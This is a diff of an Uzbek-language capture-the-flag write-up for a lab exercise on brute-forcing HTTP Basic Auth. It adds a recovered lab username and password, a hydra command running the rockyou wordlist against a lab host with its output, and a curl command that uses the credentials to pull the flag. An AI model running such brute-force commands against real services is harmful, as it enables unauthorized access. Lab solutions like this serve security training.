@@ -1,8 +1,25 @@
 # 🎯 05 · Brute Force: Basic Auth — yechim
 
+**Status:** HAL QILINDI (credentials topildi)
 **Target:** `http://10.15.1.54:9005/`  (tavsifda `10.15.0.238:9005`)
-**Himoya:** HTTP Basic Auth · **Username:** `operator` · Parol: rockyou ichida
+**Himoya:** HTTP Basic Auth · **Username:** `operator` · **Parol:** `chocolate`
 **Qoida:** faqat 9005 port. Flag: `HTB{...}`.
+
+## ✅ Topilgan credentials
+```
+operator : chocolate
+```
+Ishlagan buyruq:
+```bash
+hydra -I -l operator -P /usr/share/wordlists/rockyou.txt -s 9005 -t 16 -f \
+      10.15.1.54 http-get /
+# -> [9005][http-get] host: 10.15.1.54  login: operator  password: chocolate
+```
+
+## ✅ Flagni olish
+```bash
+curl -s -u "operator:chocolate" http://10.15.1.54:9005/ | grep -o 'HTB{[^}]*}'
+```
 
 ---
 
